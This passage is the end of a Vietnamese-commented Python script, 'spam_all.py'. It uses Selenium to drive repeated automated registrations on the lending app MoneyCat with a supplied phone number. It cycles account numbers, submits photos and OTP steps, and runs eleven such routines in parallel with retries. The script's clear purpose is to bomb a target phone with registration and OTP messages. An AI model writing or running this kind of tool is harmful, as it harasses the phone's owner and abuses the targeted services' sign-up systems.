                print(f"\n🎉 THÀNH CÔNG! Số {so_tk} ({so_chu_so} số) được chấp nhận!")
                break
    
    if thanh_cong:
        print(f"\n📌 SỐ TÀI KHOẢN LẦN {lan}: {so_tk}")
        
        print("\n⏩ NHẤN TIẾP TỤC LẦN CUỐI ĐỂ TIẾP TỤC...")
        time.sleep(2)
        try:
            tiep_tuc_lan_cuoi = driver.find_element(By.XPATH, "//button[normalize-space()='Tiếp tục']")
            driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", tiep_tuc_lan_cuoi)
            time.sleep(0.5)
            driver.execute_script("arguments[0].click();", tiep_tuc_lan_cuoi)
            print("✅ Đã nhấn Tiếp tục lần cuối, chuyển sang upload ảnh...")
            time.sleep(3)
        except Exception as e:
            print(f"⚠️ Không tìm thấy nút Tiếp tục: {e}")
        
        upload_anh_va_otp(driver, lan)
        return True
    else:
        print(f"\n❌ LẦN {lan} THẤT BẠI!")
        return False

def main_11():
    print("="*60)
    print("MONEYCAT - ĐĂNG KÝ TÀI KHOẢN")
    print("="*60)
    
    if len(sys.argv) >= 2:
        SO_DIEN_THOAI = str(sys.argv[1]).lstrip('0')
        print(f"📞 Số điện thoại từ lệnh: {SO_DIEN_THOAI}")
    else:
        SO_DIEN_THOAI = input("📞 Nhập số điện thoại: ").strip()
        SO_DIEN_THOAI = SO_DIEN_THOAI.lstrip('0')
    
    if len(sys.argv) >= 3:
        SO_LAN_LAP = int(sys.argv[2])
        print(f"🔄 Số lần lặp từ lệnh: {SO_LAN_LAP}")
    else:
        SO_LAN_LAP = int(input("🔄 Nhập số lần lặp: "))
    
    print(f"\n✅ Số điện thoại: {SO_DIEN_THOAI} | Số lần lặp: {SO_LAN_LAP}")
    
    options = Options()
    options.add_argument("--start-maximized")
    options.add_argument("--disable-notifications")
    
    thanh_cong = 0
    that_bai = 0
    
    for lan in range(1, SO_LAN_LAP + 1):
        print(f"\n{'🌟'*30}")
        print(f"🌟 LẦN {lan}/{SO_LAN_LAP}")
        print(f"{'🌟'*30}")
        
        driver = webdriver.Edge(options=options)
        ket_qua = thuc_hien_mot_lan(driver, lan, SO_DIEN_THOAI)
        driver.quit()
        
        if ket_qua:
            thanh_cong += 1
        else:
            that_bai += 1
        
        if lan < SO_LAN_LAP:
            print(f"\n⏳ Đợi 5 giây trước lần {lan+1}...")
            time.sleep(5)
    
    print("\n" + "="*60)
    print("TỔNG KẾT")
    print("="*60)
    print(f"   ✅ Thành công: {thanh_cong}/{SO_LAN_LAP} lần")
    print(f"   ❌ Thất bại: {that_bai}/{SO_LAN_LAP} lần")
    print("="*60)


# ============================================================
# DISPATCHER - python spam_all.py <phone> <count>
# ============================================================

def run_all(phone, count):
    """Chay tat ca 11 file cung luc"""
    print(f"\n{'='*60}")
    print(f"SPAM ALL - {phone} x {count}")
    print(f"{'='*60}\n")
    
    results = {}
    errors = {}
    
    def run_one(file_num):
        """Chay 1 file voi retry 3 lan"""
        max_retries = 3
        for attempt in range(1, max_retries + 1):
            print(f"[{file_num}.py] Lan thu {attempt}/{max_retries}")
            try:
                sys.argv = ['spam_all.py', str(phone), str(count)]
                
                main_func = globals().get(f'main_{file_num}')
                if main_func is None:
                    print(f"[{file_num}.py] Khong tim thay main_{file_num}")
                    results[file_num] = "❌ Khong tim thay main"
                    return
                
                # Check if it's async
                import inspect
                if inspect.iscoroutinefunction(main_func):
                    asyncio.run(main_func())
                else:
                    main_func()
                
                print(f"[{file_num}.py] Thanh cong!")
                results[file_num] = "✅"
                return
                
            except SystemExit:
                print(f"[{file_num}.py] Done (SystemExit)")
                results[file_num] = "✅"
                return
            except Exception as e:
                err = str(e)[:300]
                print(f"[{file_num}.py] Loi: {err}")
                errors[file_num] = err
                if attempt < max_retries:
                    print(f"[{file_num}.py] Restart sau 3 giay...")
                    time.sleep(3)
                else:
                    print(f"[{file_num}.py] Fail sau {max_retries} lan")
                    results[file_num] = f"❌ {err}"
    
    # Chay song song tat ca
    threads = []
    for i in range(1, 12):
        t = threading.Thread(target=run_one, args=(i,))
        t.daemon = True
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    # Bao cao
    print(f"\n{'='*60}")
    print(f"KET QUA:")
    success = sum(1 for v in results.values() if v == "✅")
    fail = sum(1 for v in results.values() if v != "✅")
    for i in range(1, 12):
        status = results.get(i, "❌ Khong chay")
        print(f"  {i}.py: {status}")
    print(f"\nThanh cong: {success}/11 | Loi: {fail}/11")
    print(f"{'='*60}")
    
    return results, errors


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python spam_all.py <phone> <count>")
        sys.exit(1)
    
    phone = sys.argv[1]
    count = int(sys.argv[2])
    run_all(phone, count)
